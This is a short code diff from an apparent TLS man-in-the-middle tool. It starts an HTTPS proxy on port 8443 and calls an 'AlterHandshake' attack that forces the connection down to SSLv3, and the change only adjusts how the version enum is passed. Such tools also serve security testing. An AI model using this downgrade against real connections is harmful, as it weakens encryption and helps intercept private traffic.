@@ -11,5 +11,5 @@ logging.basicConfig(stream=sys.stdout, level=logging.WARN)
 https_server = HTTPSProxyServer(port = 8443)
 
 attack = AlterHandshake(https_server)
-attack.downgrade_tls_version(TLSVersion.SSLv3.value)
+attack.downgrade_tls_version(TLSVersion.SSLv3)
 attack.start()
